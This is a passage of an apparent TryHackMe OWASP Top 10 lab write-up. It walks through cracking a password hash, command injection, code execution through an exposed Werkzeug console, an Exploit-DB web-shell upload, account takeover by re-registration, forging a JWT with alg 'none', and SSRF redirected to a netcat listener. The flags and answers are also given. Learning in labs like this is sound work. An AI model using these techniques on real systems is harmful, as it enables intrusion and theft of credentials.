<pre tabindex="0"><code>6eea9b7ef19179a06954edd0f6c05ceb</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>webapp.db
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>$ file webapp.db
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>webapp.db: SQLite 3.x database, last written using SQLite version 3022000, file counter 255, database pages 7, 1st free page 5, free pages 1, cookie 0x6, schema 4, UTF-8, version-valid-for <span style="color:#fab387">255</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>$ sqlite3 webapp.db
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>SQLite version 3.44.2 2023-11-24 11:41:44
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Enter <span style="color:#a6e3a1">&#34;.help&#34;</span> <span style="color:#cba6f7">for</span> usage hints.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>sqlite&gt; .tables
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>sessions  users
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>sqlite&gt; PRAGMA table_info<span style="color:#89dceb;font-weight:bold">(</span>users<span style="color:#89dceb;font-weight:bold">)</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>0|userID|TEXT|1<span style="color:#89dceb;font-weight:bold">||</span><span style="color:#fab387">1</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>1|username|TEXT|1<span style="color:#89dceb;font-weight:bold">||</span><span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>2|password|TEXT|1<span style="color:#89dceb;font-weight:bold">||</span><span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>3|admin|INT|1<span style="color:#89dceb;font-weight:bold">||</span><span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>sqlite&gt; SELECT * FROM users;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|<span style="color:#fab387">1</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|<span style="color:#fab387">1</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|<span style="color:#fab387">0</span></span></span></code></pre></div>
<br>
<p>Crack the hash.
What is the admin&rsquo;s plaintext password?</p>






<pre tabindex="0"><code>qwertyuiop</code></pre>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
<p>Login as the admin. What is the flag?</p>






<pre tabindex="0"><code>THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}</code></pre>
<p><img src="image-5.png#center" alt="alt text"></p>
<br>
<h3 id="3-injection">3. Injection</h3>
<p>Injection flaws occur because the application interprets user-controlled input as commands or parameters.</p>
<p>Some common examples:</p>
<ul>
<li><strong>SQL Injection</strong></li>
<li><strong>Command Injection</strong></li>
</ul>
<p>The main defence for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands.</p>
<ul>
<li><strong>Allow list</strong>: checks input by comparing it to a list of safe inputs. If the input is marked as safe, then it is processed. Otherwise, it&rsquo;s rejected.</li>
<li><strong>Stripping input</strong>: If the input contains dangerous characters, these are removed before processing.</li>
</ul>
<h4 id="command-injection">Command Injection</h4>
<p>Command Injection occurs when server-side code in a web app makes a call to a function that interacts with the server&rsquo;s console directly. An Injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server.</p>
<br>
<p>What strange text file is in the website&rsquo;s root directory?</p>






<pre tabindex="0"><code>drpepper.txt</code></pre>
<p><img src="image-6.png#center" alt="alt text"></p>
<br>
<p>How many non-root/non-service/non-daemon users are there?</p>






<pre tabindex="0"><code>0</code></pre>
<p>In order to find users in Linux, we can use the following command: <code>cat /etc/passwd</code>.</p>
<p><img src="image-7.png#center" alt="alt text"></p>
<p>However, there are so many users in the output. We are only interested in <strong>non-root/non-service/non-daemon</strong> users.</p>
<p>We need to remember that Linux-based systems have two types of users: <code>system</code> and <code>normal</code> users.</p>
<ul>
<li><code>system users</code> are entities created by the system to run non-interactive processes, the processes that run in the background and do not require human interaction.</li>
<li><code>normal users</code> are human users created by root or another user with root privileges.</li>
</ul>
<p>Both system and normal users in Linux have a <code>Unique User ID (UID)</code> to identify them.</p>
<ul>
<li>System users have UIDs in the range from <code>0 (root user) to 999</code>.</li>
<li>Normal users typically receive UIDs from <code>1000 onwards</code></li>
</ul>
<p>I researched further to understand <code>/etc/passwd</code> file fields.</p>
<p><img src="image-8.png#center" alt="alt text"></p>
<p>arrow #3 represents the UID. From the output of our commands <code>cat /etc/passwd</code>, I found only one user that has UID higher than 1000.
That is, <code>nobody</code>. However, I learned that the user &rsquo;nobody&rsquo; is a reserved user created by the system. Therefore, the answer to the question is actually 0.</p>
<p><img src="image-9.png#center" alt="alt text"></p>
<br>
<p>What user is this app running as?</p>






<pre tabindex="0"><code>apache</code></pre>
<p>In order to find the current user, we can run the following command: <code>$(whoami)</code>
<img src="image-10.png#center" alt="alt text"></p>
<br>
<p>What is the user&rsquo;s shell set as?</p>






<pre tabindex="0"><code>/sbin/nologin</code></pre>
<p><code>$(cat /etc/passwd)</code> command we saw above shows that user apache&rsquo;s shell at the very bottom.</p>
<p><img src="image-11.png#center" alt="alt text"></p>
<br>
<p>What version of Alpine Linux is running?</p>






<pre tabindex="0"><code>3.16.0</code></pre>
<p>The hint of the question tells us that the version can be found in <code>/etc/alpine-release</code>.</p>
<p><img src="image-12.png#center" alt="alt text"></p>
<br>
<h3 id="4-insecure-design">4. Insecure Design</h3>
<p>Insecure design refers to vulnerabilities that are inherent to the application&rsquo;s architecture. They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application (or part of it) is falwed from the start.</p>
<br>
<p>Navigate to http://10.10.118.28:85 and get into joseph&rsquo;s account. This application also has a design flaw in its password reset mechanism. Can you figure out the weakness in the proposed design and how to abuse it?</p>
<p>Try to reset joseph&rsquo;s password. keep in mind the method used by the site to validate if you are indeed joseph.</p>
<p>What is the value of the flag in joseph&rsquo;s account?</p>






<pre tabindex="0"><code>THM{Not_3ven_c4tz_c0uld_sav3_U!}</code></pre>
<p><img src="image-13.png#center" alt="alt text">
<img src="image-14.png#center" alt="alt text"></p>
<p>One of the security questions was very easy to guess, and there was no limit on password attempts, which is an insecure design.</p>
<br>
<h3 id="5-security-misconfiguration">5. Security Misconfiguration</h3>
<p>Security Misconfigurations occur when security could have been appropriately configured but was not. Even if you download the latest up-to-date software, poor configurations could make your installation vulnerable.</p>
<p>Security misconfigurations include:</p>
<ul>
<li>Poorly configured permissions on cloud services, like S3 buckets.</li>
<li>Having unnecessary features enabled, like services, pages, accounts or privileges.</li>
<li>Default accounts with unchanged passwords.</li>
<li>Error messages that are overly detailed and allow attackers to find out more about the system.</li>
<li>Not using HTTP security headers.</li>
</ul>
<br>
<p>Navigate to http://10.10.118.28:86/console to access the Werkzeug console.</p>
<p>Use the Werkzeug console to run the following Python code to execute the ls -l command on the server:
<code>import os; print(os.popen(&quot;ls -l&quot;).read())</code></p>
<p>What is the database file name (the one with the .db extension) in the current directory?</p>






<pre tabindex="0"><code>todo.db</code></pre>
<br>
<p>Modify the code to read the contents of the <code>app.py</code> file, which contains the application&rsquo;s source code. What is the value of the <code>secret_flag</code> variable in the source code?</p>






<pre tabindex="0"><code>THM{Just_a_tiny_misconfiguration}</code></pre>
<p><img src="image-15.png#center" alt="alt text"></p>
<br>
<h3 id="6-vulnerable-and-outdated-components">6. Vulnerable and Outdated Components</h3>
<p>Occasionally, you may find that the company/entity you&rsquo;re pen-testing is using a program with a well-known vulnerability.
It requires very little work to exploit its vulnerability because the vulnerability is already well-known. If a company misses a single update for a program they use, it could be vulnerable to any number of attacks.</p>
<p>Navigate to http://10.10.118.28:84 where you&rsquo;ll find a vulnerable application.
All the information you need to exploit it can be found online.</p>
<p>What is the content of the /opt/flag.txt file?</p>






<pre tabindex="0"><code>THM{But_1ts_n0t_my_f4ult!}</code></pre>
<p><img src="image-16.png#center" alt="alt text">
At the very top, the website clearly specifies that the site is built with PHP, MYSQL (procedure functions), and Bootstrap.</p>
<br>
<p><img src="image-17.png#center" alt="alt text">
I googled <code>procedure functions bootstrap exploit</code> and the first result directs to <code>Exploit-DB</code>, clearly indicating we may be onto something!</p>
<br>
<p><img src="image-18.png#center" alt="alt text">
I downloaded the exploit and ran it</p>
<br>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>47887.py  webapp.db
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>$ python 47887.py
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>usage: 47887.py <span style="color:#89dceb;font-weight:bold">[</span>-h<span style="color:#89dceb;font-weight:bold">]</span> url
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>47887.py: error: the following arguments are required: url
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>$ python 47887.py http://10.10.118.28:84
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>&gt; Attempting to upload PHP web shell...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>&gt; Verifying shell upload...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>&gt; Web shell uploaded to http://10.10.118.28:84/bootstrap/img/KJvupFii50.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>&gt; Example <span style="color:#89dceb">command</span> usage: http://10.10.118.28:84/bootstrap/img/KJvupFii50.php?cmd<span style="color:#89dceb;font-weight:bold">=</span>whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>&gt; Do you wish to launch a shell here? <span style="color:#89dceb;font-weight:bold">(</span>y/n<span style="color:#89dceb;font-weight:bold">)</span>: y
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>RCE $ cat /opt/flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>But_1ts_n0t_my_f4ult!<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
<h3 id="7-identification-and-authentication-failures">7. Identification and Authentication Failures</h3>
<p>Authentication and session management constitute core components of modern web applications.
<em>Authentication</em> allows users to gain access to web applications by verifying their identities.
The most common form of authentication is using a username and password.
If a user enters correct credentials, the server would provide ther users&rsquo; browser with a session cookie. A <em>session cookie</em> is needed because web servers use HTTP(S) to communicate, which is stateless. Attaching session cookies means the server will know who is sending what data. The server can then keep track of user&rsquo;s actions.</p>
<p>Some common flaws in authentication mechanisms:</p>
<ul>
<li>Brute force attacks</li>
<li>Use of weak credentials</li>
<li>Weak Session Cookies</li>
</ul>
<p>Some mitigation for broekn authentication mechanisms:</p>
<ul>
<li>Enforce a strong password policy</li>
<li>Enforce an automatic lockout after a certain number of attempts</li>
<li>Implement Multi-Factor Authentication</li>
</ul>
<p>Many times, what happens is that developers forget to sanitize the input given by the user in the code of their application. We will focus on a vulnerability that happens because of a developer&rsquo;s mistake but is very easy to exploit, <code>re-registration</code></p>
<p>Go to http://10.10.118.28:8088 and try to register with <code>darren</code> as your username. You&rsquo;ll see that the user already exists, so try to register <code> darren</code> (whitespace at the start) instead, and you&rsquo;ll see that you are now logged in and can see the content present only in darren&rsquo;s account, which in our case, is the flag that you need to retrieve.</p>
<br>
<p>What is the flag that you found in darren&rsquo;s account?</p>






<pre tabindex="0"><code>fe86079416a21a3c99937fea8874b667</code></pre>
<p><img src="image-19.png#center" alt="alt text"></p>
<br>
<p>Now try to do the same trick and see if you can log in as <code>arthur</code></p>






<pre tabindex="0"><code>d9ac0f7db4fda460ac3edeb75d75e16e</code></pre>
<p><img src="image-20.png#center" alt="alt text"></p>
<br>
<h3 id="8-software-and-data-integrity-failures">8. Software and Data Integrity Failures</h3>
<h4 id="what-is-integrity">What is Integrity?</h4>
<p>When talking about integrity, we refer to the capacity we have to ascertain that a piece of data remains unmodified.
Integrity is essential in cybersecurity as we care about maintaining important data free from unwanted or malicious modifications.
A <code>hash</code> is generally mentioned as a solution for ensuring data integrity.</p>
<br>
<p>What is the SHA-256 hash of <code>https://code.jquery.com/jquery-1.12.4.min.js</code>?</p>






<pre tabindex="0"><code>sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=</code></pre>
<p><img src="image-21.png#center" alt="alt text"></p>
<p>When a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser. This token will be repeated on each subsequent request to identify who we are. These session token can come in many forms but are usually assigned via <code>cookies</code>.</p>
<p>Cookies are key-value pairs that a web application will store on the user&rsquo;s browser and that will be automatically repeated on each request to the website that issued them. This could be a terrible idea security-wise because, cookies are stored on the user&rsquo;s browser, so if the user tampers with the cookie, they could potentially impersonate someone else. The application would suffer from a data integrity failure.</p>
<p>One solution to this is use some integry mechanisms to guarantee that cookie hasn&rsquo;t been altered by the user. One popular option is <code>JSON Web Tokens (JWT)</code></p>
<p>JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won&rsquo;t be able to alter the key-value pairs and pass the integrity check.</p>
<p><img src="image-24.png#center" alt="alt text">
JWT token is formed of 3 parts: <code>Header</code>, <code>Payload</code> and <code>Signature</code>.</p>
<p>A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:</p>
<ol>
<li>Modify the header section of the token so that the <code>alg</code> header would contain the value <code>none</code>.</li>
<li>Remove the signature part.</li>
</ol>
<p><img src="image-25.png#center" alt="alt text"></p>
<br>
<p>Try logging into the application as guest. What is guest&rsquo;s account password?</p>






<pre tabindex="0"><code>guest</code></pre>
<p><img src="image-22.png#center" alt="alt text"></p>
<br>
<p>If your login was successful, you should now have a JWT stored as a cookie in your browser. Press F12 to bring out the Developer Tools.</p>
<p>What is the name of the website&rsquo;s cookie containing a JWT token?</p>






<pre tabindex="0"><code>jwt-session</code></pre>
<p><img src="image-23.png#center" alt="alt text"></p>
<br>
<p>Use the knowledge gained in this task to modify the JWT toekn so that the application thinks you are the user &ldquo;admin&rdquo;.</p>
<p>What is the flag presented to the admin user?</p>






<pre tabindex="0"><code>THM{Dont_take_cookies_from_strangers}</code></pre>
<br>
<p>original token: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzE5ODk1NzI0fQ.KY3A8a6eVrLrqFt606eVjfMLYLGTRtZAwthimwQO5Lo</code></p>
<p>We learned that the JWT token is formed of 3 parts.</p>
<ul>
<li>Header: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</code></li>
<li>Payload: <code>eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzE5ODk1NzI0fQ</code></li>
<li>Signature: <code>KY3A8a6eVrLrqFt606eVjfMLYLGTRtZAwthimwQO5Lo</code></li>
</ul>
<p>Now we can use the encode/decode online tool to modify the contents of the header and remove signature.</p>
<p>First decode the <code>Header</code> part of the token
<img src="image-26.png#center" alt="alt text"></p>
<br>
<p>Modify the <code>alg</code> value to <code>none</code>
<img src="image-27.png#center" alt="alt text"></p>
<br>
<p>Decode the <code>Payload</code> part of the token
<img src="image-28.png#center" alt="alt text"></p>
<br>
<p>Modify the value of the username to <code>admin</code>
<img src="image-29.png#center" alt="alt text"></p>
<br>
<p>Remove Signature and combine those modified parts</p>
<ul>
<li>
<p>Header_modified: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0</code></p>
</li>
<li>
<p>Payload_modified: <code>eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE5ODk1NzI0fQ</code></p>
</li>
<li>
<p>Combined_token_modified: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE5ODk1NzI0fQ.</code></p>
</li>
</ul>
<p><em>Notice that I still kept the dot at then end even though we removed the signature part of the token.</em>
<br></p>
<p>Replace the value of the cookie to our modified token and refresh the page
<img src="image-30.png#center" alt="alt text"></p>
<br>
<h3 id="9-security-logging-and-monitoring-failures">9. Security Logging and Monitoring Failures</h3>
<p>When web applications are set up, every action performed by the user should be logged. Logging is important because if an incident occurs, the attackers&rsquo; activites can be traced. Once their actions are traced, their risk and impact can be determined.</p>
<p>The information stored in logs should include the following:</p>
<ul>
<li>HTTP status codes</li>
<li>Time Stamps</li>
<li>Usernames</li>
<li>API endpoints/page locations</li>
<li>IP addresses</li>
</ul>
<p>These logs have sensitive information so it&rsquo;s important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#fab387">200</span> OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span><span style="color:#fab387">200</span> OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#fab387">200</span> OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#fab387">200</span> OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#fab387">200</span> OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#fab387">200</span> OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login</span></span></code></pre></div>
<br>
<p>What IP address is the attacker using?</p>






<pre tabindex="0"><code>49.99.13.16</code></pre>
<br>
<p>What kind of attack is being carried out?</p>






<pre tabindex="0"><code>brute force</code></pre>
<br>
<h3 id="10-server-side-request-forgery-ssrf">10. Server-Side Request Forgery (SSRF)</h3>
<p>This type of vulnerability occurs when an attacker coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web applicatio nneeds to use third-party services.</p>
<p>Navigate to <code>http://MACHINE_IP</code>, where you&rsquo;ll find a simple web application. After exploring a bit, you should see an admin area, which will be our main objective. Follow the instructions on the following questions to gain access to the website&rsquo;s restricted area!</p>
<p>Explore the website. What is the only host allowed to access the admin area?</p>






<pre tabindex="0"><code>localhost</code></pre>
<br>
<p>Check the &ldquo;Download Resume&rdquo; button. Where does the server parameter point to?</p>






<pre tabindex="0"><code>secure-file-storage.com</code></pre>
<p><img src="image-31.png#center" alt="alt text"></p>
<br>
<p>Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?</p>






<pre tabindex="0"><code>THM{Hello_Im_just_an_API_key}</code></pre>
<p>replace <code>secure-file-storage.com</code> part with your own AttackBox IP address and run <code>nc -lvp 8087</code> command.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ nc -lvp <span style="color:#fab387">8087</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">8087</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>10.10.245.216: inverse host lookup failed: Unknown host
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.6.67.243<span style="color:#89dceb;font-weight:bold">]</span> from <span style="color:#89dceb;font-weight:bold">(</span>UNKNOWN<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>10.10.245.216<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">34718</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
